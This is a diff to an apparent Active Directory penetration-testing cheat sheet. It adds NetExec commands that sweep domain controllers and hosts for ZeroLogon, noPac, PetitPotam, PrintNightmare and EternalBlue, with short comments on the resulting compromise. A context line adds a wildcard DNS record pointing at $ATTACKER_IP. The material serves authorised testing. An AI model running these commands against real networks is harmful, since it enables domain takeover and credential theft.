@@ -215,6 +215,30 @@ python3 dnstool.py -u 'DOMAIN\$USER' -p '$PASS' -a add -r '*' -d $ATTACKER_IP $D
 **To Note** : ADIDNS spoofing is more of a credential harvesting / relay enabler than an instant-DA button it belongs in Misconfigurations (chainable primitive), not in the "instant DA" Tier A. It leads to the relay/coercion wins rather than being one itself.
 
 
+### Known CVEs (nxc sweep) :
+
+Modern domains are usually patched against these, so they rarely hit on a mature network, but we can always check for these CVEs , you never know :) 
+
+```bash
+# One-shot sweep — checks the host against a batch of known CVEs:
+nxc smb $DC -u $USER -p $PASS -M enum_cve
+```
+
+If something flags, you can pull in the dedicated module to dig deeper or exploit:
+
+```bash
+nxc smb $DC      -u $USER -p $PASS -M zerologon       # CVE-2020-1472 reset DC machine pwd -> DCSync -> DA
+nxc smb $DC      -u $USER -p $PASS -M nopac           # CVE-2021-42278/42287 any user (+MAQ) -> DC SYSTEM
+nxc smb $DC      -u $USER -p $PASS -M petitpotam      # CVE-2021-36942 coerce DC auth -> relay (ESC8/LDAP)
+nxc smb $TARGETS -u $USER -p $PASS -M printnightmare  # CVE-2021-34527 RCE as SYSTEM
+nxc smb $TARGETS -u '' -p ''       -M ms17-010        # MS17-010 (EternalBlue) RCE as SYSTEM
+```
+
+What we get: depends on the hit, ZeroLogon/noPac go straight to DC compromise, PetitPotam feeds our relay/ESC8 path, PrintNightmare/EternalBlue give SYSTEM on an unpatched host.
+
+**Note:** enum_cve and most of these are detection modules, a positive result means **vulnerable**, and you then point the real exploit at it. Be especially careful with ZeroLogon: the full exploit can break the DC's secure channel if run carelessly.
+
+
 ### Attack Section : 
 
 #### Coercion + NTLM Relay
